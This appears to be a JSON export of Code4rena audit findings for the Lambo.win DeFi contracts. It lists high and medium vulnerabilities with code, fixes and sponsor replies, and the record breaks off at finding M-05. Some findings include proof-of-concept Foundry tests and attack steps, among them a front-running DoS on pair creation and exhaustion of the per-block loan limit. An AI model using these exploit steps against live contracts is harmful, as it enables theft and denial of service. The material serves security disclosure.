{
  "project_id": "code4rena_lambowin_2025_02",
  "vulnerabilities": [
    {
      "finding_id": "2024-12-lambowin_H-01",
      "severity": "high",
      "title": "Loss of User Funds in VirtualToken\u2019scashInFunction Due to Incorrect Amount Minting",
      "description": "Submitted by\naldarion\n, also found by\n056Security\n,\n0xaudron\n,\n0xbrett8571\n,\n0xGondar\n,\n0xgremlincat\n,\n0xiehnnkta\n,\n0xiehnnkta\n,\n0xKann\n,\n0xLasadie\n,\n0xleadwizard\n,\n0xLeveler\n,\n0xMitev\n,\n0xMosh\n,\n4B\n,\n4rdiii\n,\nAgontuk\n,\nAkay\n,\nanonymousjoe\n,\nast3ros\n,\naster\n,\naua_oo7\n,\nBauchibred\n,\nBenRai\n,\nBenRai\n,\nBryan_Conquer\n,\nbumbleb33\n,\nc0pp3rscr3w3r\n,\nchaduke\n,\nColdless\n,\nColdless\n,\nCrazyMoose\n,\ncrmx_lom\n,\ndd0x7e8\n,\ndhank\n,\nDharkArtz\n,\ndic0de\n,\nEchoKly\n,\neLSeR17\n,\nEPSec\n,\nETHworker\n,\nEvo\n,\nFalseGenius\n,\nfarismaulana\n,\nfavelanky\n,\nFitro\n,\nFon\n,\nfranfran20\n,\ngkrastenov\n,\nGosho\n,\nharry_cryptodev\n,\nhoney-k12\n,\nhyuunn\n,\nicy_petal\n,\nInfect3d\n,\ninh3l\n,\nIzuMan\n,\njaraxxus\n,\njesusrod15\n,\nJiri123\n,\njkk812812\n,\nJohn_Femi\n,\njrstrunk\n,\njyjh\n,\nKiteWeb3\n,\nKKaminsk\n,\nkomorebi\n,\nKupiaSec\n,\nlanyi2023\n,\nLe_Rems\n,\nLe_Rems\n,\nLeFy\n,\nLordAdhaar\n,\nm4k2\n,\nm4k2\n,\nmacart224\n,\nMatin\n,\nmgf15\n,\nmontecristo\n,\nMoyinmaala\n,\nMrPotatoMagic\n,\nmrudenko\n,\nnewspacexyz\n,\nNexusAudits\n,\nOpaBatyo\n,\nOxsadeeq\n,\nparishill24\n,\npfapostol\n,\npontifex\n,\nprapandey031\n,\nProsperity\n,\nPumpkingWok\n,\nrare_one\n,\nRhaydden\n,\nrilwan99\n,\nRobinx33\n,\nrouhsamad\n,\nrspadi\n,\nsaikumar279\n,\nShubham\n,\nsilver_eth\n,\nSilverwind\n,\nslowbugmayor\n,\nSpicyMeatball\n,\nStingo\n,\nstuart_the_minion\n,\nSummer\n,\nTenderBeastJr\n,\nthreadmodeling\n,\ntpiliposian\n,\ntusharr1411\n,\nTychai0s\n,\ntypicalHuman\n,\nudo\n,\nVagabond\n,\nVasquez\n,\nviking71\n,\nvladi319\n,\nweb3km\n,\nwillycode20\n,\nX0sauce\n,\nxiao\n,\nYoanYJD\n,\nzaevlad\n,\nzaevlad\n,\nZhengZuo999\n,\nzxriptor\n, and\nzzebra83\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/VirtualToken.sol#L78\n\nIn the VirtualToken contract\ncashIn()\nfunction uses msg.value instead of amount for minting tokens when dealing with ERC20 tokens. This causes users to lose their deposited ERC20 tokens as they receive 0 virtual tokens in return.\n\nThe root cause is the incorrect usage of msg.value in the minting logic. While the function correctly handles the token transfer with the amount parameter, it incorrectly uses msg.value for minting, which is probably 0 for ERC20 token transactions. They receive 0 virtual tokens in return (since msg.value is 0 for ERC20 transactions)\n\nfunction\ncashIn\n(\nuint256\namount\n)\nexternal\npayable\nonlyWhiteListed\n{\nif\n(\nunderlyingToken\n==\nLaunchPadUtils\n.\nNATIVE_TOKEN\n) {\nrequire\n(\nmsg\n.\nvalue\n==\namount\n,\n\"Invalid ETH amount\"\n);\n}\nelse\n{\n_transferAssetFromUser\n(\namount\n);\n}\n// @audit Critical: Using msg.value instead of amount\n_mint\n(\nmsg\n.\nsender\n,\nmsg\n.\nvalue\n);\n// Will be 0 for ERC20 tokens\nemit\nCashIn\n(\nmsg\n.\nsender\n,\nmsg\n.\nvalue\n);\n}\n\nfunction\ncashIn\n(\nuint256\namount\n)\nexternal\npayable\nonlyWhiteListed\n{\nif\n(\nunderlyingToken\n==\nLaunchPadUtils\n.\nNATIVE_TOKEN\n) {\nrequire\n(\nmsg\n.\nvalue\n==\namount\n,\n\"Invalid ETH amount\"\n);\n}\nelse\n{\n_transferAssetFromUser\n(\namount\n);\n}\n_mint\n(\nmsg\n.\nsender\n,\namount\n);\n// Use amount instead of msg.value\n}\n\nShaneson (Lambo.win) confirmed and commented\n:\n\nVirtualToken should support USDT, USDC in the future, so cashIn should use amount instead of msg.value. This is the\nfixed PR\n, please review."
    },
    {
      "finding_id": "2024-12-lambowin_H-02",
      "severity": "high",
      "title": "LamboFactory can be permanently DoS-ed due tocreatePaircall reversal",
      "description": "Submitted by\nzxriptor\n, also found by\nast3ros\n,\nEvo\n,\nFalseGenius\n,\nGiorgio\n,\nInfect3d\n,\ninh3l\n,\nLe_Rems\n,\nm4k2\n,\nmrudenko\n,\npaco\n,\nrouhsamad\n,\nshaflow2\n,\nSpicyMeatball\n,\nTheFabled\n,\nthreadmodeling\n, and\nweb3km\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/LamboFactory.sol#L72\n\nLamboFactory.createLaunchPad\ndeploys new token contract and immediately sets up a new Uniswap V2 pool by calling\ncreatePair\n. This can be frontrun by the attacker by setting up a pool for the next token to be deployed.\n\nContract addresses are deterministic and can be calculated in advance. That opens a possibility for the attacker to pre-calculate the address of the next LamboToken to be deployed. As can be seen below, LamboFactory uses\nclone\n() method from OpenZeppelin\nClones\nlibrary, which uses\nCREATE\nEMV opCode under the hood.\n\nfunction\n_deployLamboToken\n(\nstring\nmemory\nname\n,\nstring\nmemory\ntickname\n)\ninternal\nreturns\n(\naddress\nquoteToken\n) {\n// Create a deterministic clone of the LamboToken implementation\n>>>\nquoteToken\n=\nClones\n.\nclone\n(\nlamboTokenImplementation\n);\n// Initialize the cloned LamboToken\nLamboToken\n(\nquoteToken\n).\ninitialize\n(\nname\n,\ntickname\n);\nemit\nTokenDeployed\n(\nquoteToken\n);\n}\n\nCREATE\nopcode calculates new contract address based on factory contract address and nonce (number of deployed contracts the factory has previously deployed):\n\nThe destination address is calculated as the rightmost 20 bytes (160 bits) of the Keccak-256 hash of the rlp encoding of the sender address followed by its nonce. That is:\naddress = keccak256(rlp([sender\naddress,sender\nnonce]))[12:]\n\nhttps://www.evm.codes/#f0\n\nHence an attacker can calculate the address of the next token to be deployed and directly call\nUniswapV2Factory.createPair\nwhich will result in a new liquidity pool being created BEFORE the token has been deployed.\n\nSuch state will lead all subsequent calls to\nLamboFactory.createLaunchPad\nto revert, because of the pair existence check in Uniswap code, without the possibility to fix that:\n\nhttps://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Factory.sol#L27\n\nfunction\ncreatePair\n(\naddress\ntokenA\n,\naddress\ntokenB\n)\nexternal\nreturns\n(\naddress\npair\n) {\nrequire\n(\ntokenA\n!=\ntokenB\n,\n'UniswapV2: IDENTICAL_ADDRESSES'\n);\n(\naddress\ntoken0\n,\naddress\ntoken1\n) =\ntokenA\n<\ntokenB\n? (\ntokenA\n,\ntokenB\n) : (\ntokenB\n,\ntokenA\n);\nrequire\n(\ntoken0\n!=\naddress\n(\n0\n),\n'UniswapV2: ZERO_ADDRESS'\n);\n>>>\nrequire\n(\ngetPair\n[\ntoken0\n][\ntoken1\n] ==\naddress\n(\n0\n),\n'UniswapV2: PAIR_EXISTS'\n);\n// single check is sufficient\n// ... the rest of the code is ommitted ...\n}\n\nCheck pool existence using\nIUniswapV2Factory.getPair()\n.\n\nShaneson (Lambo.win) commented\n:\n\nWe would use cloneDeterministic instead of clone, and the backend will pass the random salt from off-chain.\nAnd this is the\nfixed PR\n.\n\nKoolex (judge) commented\n:\n\nI believe with this fix, front-run can still be done.  It is better to check if the pair exists, then simply don\u2019t create it. This way, there is zero DoS."
    },
    {
      "finding_id": "2024-12-lambowin_H-03",
      "severity": "high",
      "title": "Calculation fordirectionMaskis incorrect",
      "description": "Submitted by\n0xleadwizard\n, also found by\nAgontuk\n,\nBenRai\n,\nInfect3d\n,\nJiri123\n,\nNexusAudits\n,\nRhaydden\n,\nrouhsamad\n,\nSpicyMeatball\n, and\nZhengZuo999\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/rebalance/LamboRebalanceOnUniwap.sol#L165\n\nThe\n_getQuoteAndDirection\nfunction\u2019s flawed logic can cause incorrect direction determination in the UniswapV3 pool. The recommended mitigation ensures that the function dynamically identifies token0 and token1 and assigns the correct direction mask. This prevents potential financial losses and ensures accurate rebalancing.\n\nThe function\npreviewRebalance\nis called off-chain, to calculate values that can be passed to the function\nrebalance\nwhen making a call for balancing the uniswapV3 vETH/WETH pool.\n\nfunction\npreviewRebalance\n()\npublic\nview\nreturns\n(\nbool\nresult\n,\nuint256\ndirectionMask\n,\nuint256\namountIn\n,\nuint256\namountOut\n)\n{\naddress\ntokenIn\n;\naddress\ntokenOut\n;\n(\ntokenIn\n,\ntokenOut\n,\namountIn\n) =\n_getTokenInOut\n();\n(\namountOut\n,\ndirectionMask\n) =\n_getQuoteAndDirection\n(\ntokenIn\n,\ntokenOut\n,\namountIn\n);\nresult\n=\namountOut\n>\namountIn\n;\n}\n\nThe function\n_getQuoteAndDirection\ntakes\ntokenIn\n,\ntokenOut\n&\namountIn\nas parameter to output\namountOut\n&\ndirectionMask\n.\n\ndirectionMask\nis used to decide if the swap is\nzero-for-one\nor\none-for-zero\nin OKX.\n\nThe\n_getQuoteAndDirection\nfunction assumes that WETH is always token1, which can lead to incorrect direction determination in cases where WETH is actually token0. This is due to the fact that Uniswap sorts token0 and token1 lexicographically by their addresses, and not based on their logical roles.\n\nfunction\n_getQuoteAndDirection\n(\naddress\ntokenIn\n,\naddress\ntokenOut\n,\nuint256\namountIn\n)\ninternal\nview\nreturns\n(\nuint256\namountOut\n,\nuint256\ndirectionMask\n) {\n(\namountOut\n, , , ) =\nIQuoter\n(\nquoter\n).\nquoteExactInputSingleWithPool\n(\nIQuoter\n.\nQuoteExactInputSingleWithPoolParams\n({\ntokenIn:\ntokenIn\n,\ntokenOut:\ntokenOut\n,\namountIn:\namountIn\n,\nfee:\nfee\n,\npool:\nuniswapPool\n,\nsqrtPriceLimitX96:\n0\n})\n);\n>>\ndirectionMask\n= (\ntokenIn\n==\nweth\n) ?\n_BUY_MASK\n:\n_SELL_MASK\n;\n}\n\nExample: If the UniswapV3 pool has token0 as WETH (lower address value) and token1 as vETH (higher address value), and the pool has more vETH than WETH, the tokenIn will be WETH. However, because WETH is token0 in this case, the correct direction would be zero-for-one. The current logic mistakenly assumes WETH is token1, leading to an incorrect direction of one-for-zero.\n\nFor context, here is how the MASK is used in OKX:\n\nMASK defined\n\nuint256\nprivate\nconstant\n_ONE_FOR_ZERO_MASK\n=\n1\n<<\n255\n;\n// Mask for identifying if the swap is one-for-zero\n\nMASK used\n\nlet\nzeroForOne\n:=\neq\n(\nand\n(\n_pool\n,\n_ONE_FOR_ZERO_MASK\n),\n0\n)\n\nAdd the logic for considering if the\ntokenIn\nis\ntoken0\nor\ntoken1\n.\n\nfunction\n_getQuoteAndDirection\n(\naddress\ntokenIn\n,\naddress\ntokenOut\n,\nuint256\namountIn\n)\ninternal\nview\nreturns\n(\nuint256\namountOut\n,\nuint256\ndirectionMask\n) {\n// Retrieve token0 and token1 from the Uniswap pool\naddress\ntoken0\n=\nIUniswapV3Pool\n(\nuniswapPool\n).\ntoken0\n();\naddress\ntoken1\n=\nIUniswapV3Pool\n(\nuniswapPool\n).\ntoken1\n();\n// Call the quoter to get the amountOut\n(\namountOut\n, , , ) =\nIQuoter\n(\nquoter\n).\nquoteExactInputSingleWithPool\n(\nIQuoter\n.\nQuoteExactInputSingleWithPoolParams\n({\ntokenIn:\ntokenIn\n,\ntokenOut:\ntokenOut\n,\namountIn:\namountIn\n,\nfee:\nfee\n,\npool:\nuniswapPool\n,\nsqrtPriceLimitX96:\n0\n})\n);\n// Determine directionMask based on tokenIn position (token0 or token1)\nif\n(\ntokenIn\n==\ntoken0\n) {\ndirectionMask\n=\n_SELL_MASK\n;\n// Zero-for-one direction\n}\nelse\n{\ndirectionMask\n=\n_BUY_MASK\n;\n// One-for-zero direction\n}\n}\n\nShaneson (Lambo.win) acknowledged and commented\n:\n\nWhen the VETH is deployed, the direction will be updated. But yes, this is still a good suggestion."
    },
    {
      "finding_id": "2024-12-lambowin_H-04",
      "severity": "high",
      "title": "Anyone can callLamboRebalanceOnUniwap.sol::rebalance()function with any arbitrary value, leading to rebalancing goal i.e. (1:1 peg) unsuccessful.",
      "description": "Submitted by\norangesantra\n, also found by\nEPSec\nand\nEvo\n\nAnyone can call\nLamboRebalanceOnUniwap.sol::rebalance()\nfunction with any arbitrary value, leading to rebalancing goal i.e. (1:1 peg) unsuccessful.\n\nThe parameters required in\nrebalance()\nfunction will are,\nuint256 directionMask\n,\nuint256 amountIn\n,\nuint256 amountOut\n. The typical value should be -\n\ndirectionMask =\n0\nor\n1<<255\n\namountIn and amountOut obtained from\nLamboRebalanceOnUniwap.sol::previewRebalance()\n\nBut since there is no check, to ensure the typical values of parameter in the function, this can cause the flashloan for wrong amount or flashloan reverting if directionMask is any other value apart from\n0\nor\n1<<255\n.\n\nIf flashloan of wrong amount occurs it means the pool will be unbalanced again with different value instead of balancing.\n\nBy pasting the following code in\nRebalanceTest.t.sol\n, we can see that\nafter_uniswapPoolWETHBalance:2\nand\nafter_uniswapPoolVETHBalance:2\nare much distant.\n\nThe test does the following -\n\nDo the usual rebalancing operation by executing\nrebalance()\n, by proving parameter from\npreviewRebalance()\nand legit\ndirectionMask\n.\nAfter snapshot revert, it calls the\nrebalance()\nfunction from an unauthorised user with an abritrary value.\nIn the console log we can see, that the rebalance with typical parameters does the balancing goal of nearly 1:1\n\n// after_uniswapPoolWETHBalance:  449788833045085369301\n// after_uniswapPoolVETHBalance:  452734978359843468645\n\nBut for second part output statement obtained is as follow (unable to obtain 1:1 peg)-\n\n// after_uniswapPoolWETHBalance:2  350165415961266006942\n// after_uniswapPoolVETHBalance:2  552734978359843468645\n\nPaste the below code in RebalanceTest.t.sol.\n\nfunction test_any_caller() public {\nuint256 amount = 422 ether;\nuint256 _v3pool = uint256(uint160(uniswapPool)) | (_ONE_FOR_ZERO_MASK);\nuint256[] memory pools = new uint256[](1);\npools[0] = _v3pool;\nuint256 amountOut0 = IDexRouter(OKXRouter).uniswapV3SwapTo{value: amount}(\nuint256(uint160(multiSign)),\namount,\n0,\npools\n);\nconsole.log(\"user amountOut0\", amountOut0);\n(bool result, uint256 directionMask, uint256 amountIn, uint256 amountOut) = lamboRebalance.previewRebalance();\nrequire(result, \"Rebalance not profitable\");\nuint256 before_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);\nuint256 before_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);\nuint snapshot = vm.snapshot();\nlamboRebalance.rebalance(directionMask, amountIn, amountOut);\nuint256 initialBalance = IERC20(WETH).balanceOf(address(this));\nlamboRebalance.extractProfit(address(this), WETH);\nuint256 finalBalance = IERC20(WETH).balanceOf(address(this));\nrequire(finalBalance > initialBalance, \"Profit must be greater than 0\");\nconsole.log(\"profit :\", finalBalance - initialBalance);\nuint256 after_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);\nuint256 after_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);\n// profit : 2946145314758099343\n// before_uniswapPoolWETHBalance:  872000000000000000000\n// before_uniswapPoolVETHBalance:  33469956719686937289\n// after_uniswapPoolWETHBalance:  449788833045085369301\n// after_uniswapPoolVETHBalance:  452734978359843468645\nconsole.log(\"before_uniswapPoolWETHBalance: \", before_uniswapPoolWETHBalance);\nconsole.log(\"before_uniswapPoolVETHBalance: \", before_uniswapPoolVETHBalance);\nconsole.log(\"after_uniswapPoolWETHBalance: \", after_uniswapPoolWETHBalance);\nconsole.log(\"after_uniswapPoolVETHBalance: \", after_uniswapPoolVETHBalance);\nvm.revertTo(snapshot);\n// creating a non-authorised address.\nuint256 signerPrivateKey = 0xabc123;\naddress signer = vm.addr(signerPrivateKey);\ndeal(WETH, signer, amountIn + 100 ether);\ndeal(VETH, signer, amountOut + 100 ether);\nvm.startPrank(signer);\nlamboRebalance.rebalance(directionMask, amountIn + 100 ether, amountOut + 100 ether);\nvm.stopPrank();\ninitialBalance = IERC20(WETH).balanceOf(address(this));\nlamboRebalance.extractProfit(address(this), WETH);\nfinalBalance = IERC20(WETH).balanceOf(address(this));\nrequire(finalBalance > initialBalance, \"Profit must be greater than 0\");\nconsole.log(\"profit :\", finalBalance - initialBalance);\nafter_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);\nafter_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);\n// profit : 2569562398577461702\n// before_uniswapPoolWETHBalance:2  872000000000000000000\n// before_uniswapPoolVETHBalance:2  33469956719686937289\n// after_uniswapPoolWETHBalance:2  350165415961266006942\n// after_uniswapPoolVETHBalance:2  552734978359843468645\nconsole.log(\"before_uniswapPoolWETHBalance:2 \", before_uniswapPoolWETHBalance);\nconsole.log(\"before_uniswapPoolVETHBalance:2 \", before_uniswapPoolVETHBalance);\nconsole.log(\"after_uniswapPoolWETHBalance:2 \", after_uniswapPoolWETHBalance);\nconsole.log(\"after_uniswapPoolVETHBalance:2 \", after_uniswapPoolVETHBalance);\nrequire(\n((before_uniswapPoolWETHBalance + before_uniswapPoolVETHBalance) -\n(after_uniswapPoolWETHBalance + after_uniswapPoolVETHBalance) ==\n(finalBalance - initialBalance)),\n\"Rebalance Profit comes from pool's rebalance\"\n);\n}\n\nCheck the parameter of\nrebalance()\nfunction whether they are legit or not, i.e. as per flashloan requirement.\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-01",
      "severity": "medium",
      "title": "Since the cost of launching a new pool is minimal, an attacker can maliciously consumeVirtualTokens",
      "description": "Submitted by\nshaflow2\n, also found by\n0xD4n13l\n,\n0xGondar\n,\nc0pp3rscr3w3r\n,\nColdless\n,\nEPSec\n,\nEvo\n,\nfarismaulana\n,\nFitro\n,\nFon\n,\nInfect3d\n,\njaraxxus\n,\nJiri123\n,\njkk812812\n,\nkodyvim\n,\nLe_Rems\n,\nm4k2\n,\nmacart224\n,\nMrPotatoMagic\n,\nMushow\n,\nNexusAudits\n,\nNexusAudits\n,\nparishill24\n,\npontifex\n,\nprapandey031\n,\nrouhsamad\n,\nrspadi\n,\nthreadmodeling\n,\nTychai0s\n,\ntypicalHuman\n,\nVasquez\n,\nzxriptor\n, and\nzzebra83\n\nWhen launching a new pool, the factory contract needs to call the\ntakeLoan\nfunction to intervene with virtual liquidity. The amount that can be borrowed is limited to 300 ether per block.\n\ngithub:\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/VirtualToken.sol#L93\n\nfunction\ntakeLoan\n(\naddress\nto\n,\nuint256\namount\n)\nexternal\npayable\nonlyValidFactory\n{\nif\n(\nblock\n.\nnumber\n>\nlastLoanBlock\n) {\nlastLoanBlock\n=\nblock\n.\nnumber\n;\nloanedAmountThisBlock\n=\n0\n;\n}\nrequire\n(\nloanedAmountThisBlock\n+\namount\n<=\nMAX_LOAN_PER_BLOCK\n,\n\"Loan limit per block exceeded\"\n);\nloanedAmountThisBlock\n+=\namount\n;\n_mint\n(\nto\n,\namount\n);\n_increaseDebt\n(\nto\n,\namount\n);\nemit\nLoanTaken\n(\nto\n,\namount\n);\n}\n\nHowever, when launching a new pool, the amount of virtual liquidity is controlled by users, and the minimum cost to launch a new pool is very low, requiring only gas fees and a small buy-in fee. This allows attackers to launch malicious new pools in each block, consuming the borrowing limit, which prevents legitimate users from launching new pools.\n\nUser 1 and User 2 submit transactions to launch pools with virtual liquidity of 10 ether and 20 ether, respectively.\nAn attacker submits a transaction to launch a pool with 300 ether of virtual liquidity and offers a higher gas fee, causing their transaction to be prioritized and included in the block.\nDue to the\ntakeLoan\ndebt limit, the transactions of User 1 and User 2 revert.\nThe attacker can repeat this attack in the next block.\n\nfunction\ntest_createLaunchPool1\n()\npublic\n{\n(\naddress\nquoteToken\n,\naddress\npool\n,\nuint256\namountYOut\n) =\nlamboRouter\n.\ncreateLaunchPadAndInitialBuy\n{\nvalue:\n10\n}(\naddress\n(\nfactory\n),\n\"LamboToken\"\n,\n\"LAMBO\"\n,\n300\nether\n,\n10\n);\n}\n\nRunning the above test can prove that an attacker only needs to consume the gas fee + 10 wei to exhaust the entire block\u2019s virtual liquidity available for creating new pools.\n\nCharge a launch fee for new pools to increase attack costs\nLimit the maximum virtual liquidity a user can consume per transaction\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-02",
      "severity": "medium",
      "title": "LamboRebalanceOnUniswap::_getTokenInOutformula used to compute rebalancing amount is wrong for a UniV3 pool",
      "description": "Submitted by\nInfect3d\n, also found by\nEPSec\n,\nka14ar\n,\nKing_9aimon\n,\nKupiaSec\n, and\npontifex\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/b8b8b0b1d7c9733a7bd9536e027886adb78ff83a/src/rebalance/LamboRebalanceOnUniwap.sol#L116-L148\n\nThe formula implemented assumes that the pool is based on a constant sum AMM formula (\nx+y = k\n), and also eludes the fact that reserves in a UniV3 pool do not directly relate to the price because of the 1-sided ticks liquidity.\n\nThis make the function imprecise at best, and highly imprecise when liquidity is deposited in distant ticks, with no risk involved for actors depositing in those ticks.\n\nThe\npreviewRebalance\nfunction has been developed to output all the necessary input parameters required to call the\nrebalance\nfunction, which goal is to swap tokens in order to keep the peg of the virtual token in comparison to its counterpart (e.g keep vETH/ETH prices = 1):\n\nFile:\nsrc\n/\nrebalance\n/\nLamboRebalanceOnUniwap\n.\nsol\n128\n:\nfunction\n_getTokenBalances\n()\ninternal\nview\nreturns\n(\nuint256\nwethBalance\n,\nuint256\nvethBalance\n) {\n129\n:\nwethBalance\n=\nIERC20\n(\nweth\n).\nbalanceOf\n(\nuniswapPool\n);         <<\u274c(\n1\n)\nthis\ndoes\nnot\nrepresent\nthe\nactive\ntick\n130\n:\nvethBalance\n=\nIERC20\n(\nveth\n).\nbalanceOf\n(\nuniswapPool\n);\n131\n:     }\n132\n:\n133\n:\nfunction\n_getTokenInOut\n()\ninternal\nview\nreturns\n(\naddress\ntokenIn\n,\naddress\ntokenOut\n,\nuint256\namountIn\n) {\n134\n:         (\nuint256\nwethBalance\n,\nuint256\nvethBalance\n) =\n_getTokenBalances\n();\n135\n:\nuint256\ntargetBalance\n= (\nwethBalance\n+\nvethBalance\n) /\n2\n;    <<\u274c(\n2\n)\nwrong\nformula\n136\n:\n137\n:\nif\n(\nvethBalance\n>\ntargetBalance\n) {\n138\n:\namountIn\n=\nvethBalance\n-\ntargetBalance\n;\n139\n:\ntokenIn\n=\nweth\n;\n140\n:\ntokenOut\n=\nveth\n;\n141\n:         }\nelse\n{\n142\n:\namountIn\n=\nwethBalance\n-\ntargetBalance\n;\n143\n:\ntokenIn\n=\nveth\n;\n144\n:\ntokenOut\n=\nweth\n;\n145\n:         }\n146\n:\n147\n:\nrequire\n(\namountIn\n>\n0\n,\n\"amountIn must be greater than zero\"\n);\n148\n:     }\n149\n:\n\nThe implemented formula is incorrect, as it will not rebalance the pool for 2 reasons:\n\nIn Uniswap V3, LPs can deposit tokens in any ticks they want, even though those ticks are not active and do not participate to the actual price.\nBut those tokens will be held by the pool, and thus be measured by\n_getTokenBalances\nThe formula used to compute the targetBalance is incorrect because of how works the constant product formula\nx*y=k\n\nRegarding (2), consider this situation:\nWETH balance: 1000\nvETH balance: 900\ntargetBalance = (1000 + 900) / 2 = 950\namountIn = 1000 - 950 = 50 (vETH)\n\nSwapping 50 vETH into the pool will not return 50 WETH because of the inherent slippage of the constant product formula.\n\nNow, add to this bullet (1), and the measured balance will be wrong anyway because of the liquidity deposited in inactive ticks, making the result even more shifted from the optimal result.\n\nThe function is not performing as intended, leading to invalid results which complicates the computation of rebalancing amounts necessary to maintain the peg.\n\nSince this function is important to maintain the health of vETH as it has access to on-chain values, allowing precise rebalancing, failing to devise and implement a reliable solution for rebalancing before launch could result in significant issues.\n\nReconsider the computations of rebalancing amounts for a more precise one if keeping a 1:1 peg is important.\n\nYou might want to get inspiration from\nUSSDRebalancer::rebalance()\n.\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-03",
      "severity": "medium",
      "title": "sellQuoteandbuyQuoteare missing deadline check inLamboVEthRouter",
      "description": "Submitted by\nInfect3d\n, also found by\n0xDemon\n,\nBryan_Conquer\n,\nEvo\n,\nhyuunn\n,\nSpicyMeatball\n,\nKupiaSec\n,\nNexusAudits\n,\nOpaBatyo\n, and\npumba\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/LamboVEthRouter.sol#L102-L102\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/main/src/LamboVEthRouter.sol#L148-L148\n\nsellQuote\nand\nbuyQuote\nare missing deadline check in\nLamboVEthRouter\n.\n\nBecause of that, transactions can still be stuck in the mempool and be executed a long time after the transaction is initially called. During this time, the price in the Uniswap pool can change. In this case, the slippage parameters can become outdated and the swap will become vulnerable to sandwich attacks.\n\nThe protocol has made the choice to develop its own router to swap tokens for users, which imply calling the low level\nUniswapV2Pair::swap\nfunction:\n\n// this low-level function should be called from a contract which performs important safety checks\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\nrequire(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');\n(uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\nrequire(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');\n\nAs the comment indicates, this function require important safety checks to be performed.\n\nA good example of safe implementation of such call can be found in the\nUniswapV2Router02::swapExactTokensForTokens\nfunction:\n\nfunction swapExactTokensForTokens(\nuint amountIn,\nuint amountOutMin,\naddress[] calldata path,\naddress to,\nuint deadline\n) external virtual override ensure(deadline) returns (uint[] memory amounts) {\namounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\nrequire(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\nTransferHelper.safeTransferFrom(\npath[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n);\n_swap(amounts, path, to);\n}\n\nAs we can see, 2 safety parameters are present here:\namountOutMin\nand\ndeadline\n.\n\nNow, if we look at\nSellQuote\n(\nbuyQuote\nhaving the same issue):\n\nFile: src/LamboVEthRouter.sol\n148:     function _buyQuote(address quoteToken, uint256 amountXIn, uint256 minReturn) internal returns (uint256 amountYOut) {\n149:         require(msg.value >= amountXIn, \"Insufficient msg.value\");\n150:\n...:\n...:       //* ---------- some code ---------- *//\n...:\n168:         require(amountYOut >= minReturn, \"Insufficient output amount\");\n\nWe can see that no\ndeadline\nparameter is present.\n\nThe transaction can still be stuck in the mempool and be executed a long time after the transaction is initially called. During this time, the price in the Uniswap pool can change. In this case, the slippage parameters can become outdated and the swap will become vulnerable to sandwich attacks.\n\nAdd a deadline parameter.\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-04",
      "severity": "medium",
      "title": "Accumulated ETH in the LamboVEthRouter will be irretrievable",
      "description": "Submitted by\ninh3l\n, also found by\n0xLasadie\n,\naua_oo7\n,\nbareli\n,\nbumbleb33\n,\nDaniel526\n,\nDaniel526\n,\neta\n,\nEvo\n,\ngajiknownnothing\n,\ninh3l\n,\nRyonen\n,\nLe_Rems\n,\nm4k2\n,\nmansa11\n,\nMrMatrix\n,\nphenom80\n,\nsaikumar279\n,\nShubham\n, and\nVagabond\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/LamboVEthRouter.sol#L179-L183\n\nhttps://github.com/code-423n4/2024-12-lambowin/blob/874fafc7b27042c59bdd765073f5e412a3b79192/src/LamboVEthRouter.sol#L188\n\nOver time, ETH will be accumulated in the LamboVEthRouter and it will be irretrievable leading to loss of funds.\n\nFirst, LamboVEthRouter.sol has a\nreceive\nfunction that allows users to send ETH to the contract.\n\n>>      receive() external payable {}\n\nAlso, in the\n_buyQuote\nfunction, there is a check for if the msg.value is greater than the amountXIn + fee + 1. If it is, it will refund the user the excess ETH minus 1 wei.\n\nfunction _buyQuote(address quoteToken, uint256 amountXIn, uint256 minReturn) internal returns (uint256 amountYOut) {\nrequire(msg.value >= amountXIn, \"Insufficient msg.value\");\n//...\n>>       if (msg.value > (amountXIn + fee + 1)) {\n(bool success, ) = payable(msg.sender).call{value: msg.value - amountXIn - fee - 1}(\"\");\nrequire(success, \"ETH transfer failed\");\n}\nemit BuyQuote(quoteToken, amountXIn, amountYOut);\n}\n\nOver time, with the amount of transactions that will be processed, the accumulated 1 weis including any other excess ETH will all add up to a significant amount. Also, as ETH price increases, these small costs can eventually become quite substantial. But there\u2019s no way to sweep the tokens out of the contract. Hence loss of funds for both users and the protocol.\n\nInclude a sweep function in the contract, or refund actual excess amount to the users.\n\nShaneson (Lambo.win) acknowledged"
    },
    {
      "finding_id": "2024-12-lambowin_M-05",
      "severity": "medium",
      "title": "Incorrect Struct Field and HardcodedsqrtPriceLimitX96in_getQuoteAndDirection",
